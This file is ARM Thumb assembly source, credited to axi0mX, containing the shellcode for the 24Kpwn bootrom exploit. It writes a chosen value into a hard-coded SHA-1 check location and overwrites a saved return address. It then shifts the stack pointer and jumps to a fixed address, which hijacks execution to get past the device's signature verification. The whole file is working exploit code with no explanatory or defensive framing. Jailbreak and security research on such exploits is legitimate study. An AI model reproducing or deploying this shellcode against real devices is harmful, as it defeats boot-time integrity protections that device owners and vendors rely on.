@ 24Kpwn-shellcode.S
@ Author: axi0mX
@ Shellcode for 24Kpwn exploit.

.text

.pool
.set SHA1_DWORD_ADDRESS,                0x840241cc
.set SHA1_DWORD_VALUE,                  0x80100040
.set NEW_LR_ADDRESS,                    0x84033f18
.set NEW_LR_VALUE,                          0x2655
.set NEW_PC_VALUE,                          0x21ed

.global _start

_start:
.code 16
    LDR R0, =SHA1_DWORD_ADDRESS
    LDR R1, =SHA1_DWORD_VALUE
    STR R1, [R0]                                @ *SHA1_DWORD_ADDRESS = SHA1_DWORD_VALUE

    LDR R0, =NEW_LR_ADDRESS
    LDR R1, =NEW_LR_VALUE
    STR R1, [R0]                                @ *NEW_LR_ADDRESS = NEW_LR_VALUE

    ADD SP, SP, #0x48                           @ SP += 0x48

    LDR R0, =NEW_PC_VALUE
    BX R0                                       @ goto NEW_PC_VALUE
